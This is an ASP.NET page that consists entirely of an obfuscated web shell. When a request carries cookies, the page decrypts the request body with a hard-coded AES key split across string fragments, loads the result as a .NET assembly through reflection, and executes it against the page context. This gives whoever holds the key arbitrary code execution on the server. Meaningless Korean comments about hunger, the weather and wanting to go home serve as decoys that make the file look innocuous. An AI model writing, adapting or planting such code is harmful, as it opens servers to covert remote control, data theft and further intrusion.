<%@ Page Language="C#" %>
<script runat="server">
void Page_Load(object s, EventArgs e)
{
    // 배고파요, 치킨 먹고 싶다.
    if (Request.Cookies.Count != 0)
    {
        // 오늘 날씨가 정말 좋네요.
        var a = new System.Collections.Generic.List<string> { "ca6345", "7538b9b1e0" };
        var b = string.Join("", a.ToArray());

        // 이 코드는 이해하기 어렵습니다.
        Func<string, byte[]> c = (d) => System.Text.Encoding.Default.GetBytes(d);
        Func<System.IO.Stream, byte[]> f = (g) => {
            var h = new byte[g.Length];
            g.Read(h, 0, h.Length);
            return h;
        };

        // 너무 졸려...
        var i = c(b);
        var j = f(Request.InputStream);

        // 퇴근하고 싶다.
        Func<byte[], byte[], byte[]> k = (l, m) => {
            var n = new System.Security.Cryptography.RijndaelManaged();
            var o = n.CreateDecryptor(l, l);
            return o.TransformFinalBlock(m, 0, m.Length);
        };

        // 그냥 의미 없는 주석입니다.
        var p = k(i, j);
        var q = new string[] { "Load", "CreateInstance", "Equals" };

        var r = typeof(System.Reflection.Assembly);
        var t = r.GetMethod(q[0], new Type[] { typeof(byte[]) }).Invoke(null, new object[] { p });

        var u = t.GetType().GetMethod(q[1], new Type[] { typeof(string) }).Invoke(t, new object[] { "K" });

        u.GetType().GetMethod(q[2], new Type[] { typeof(object) }).Invoke(u, new object[] { this });
    }
}
</script>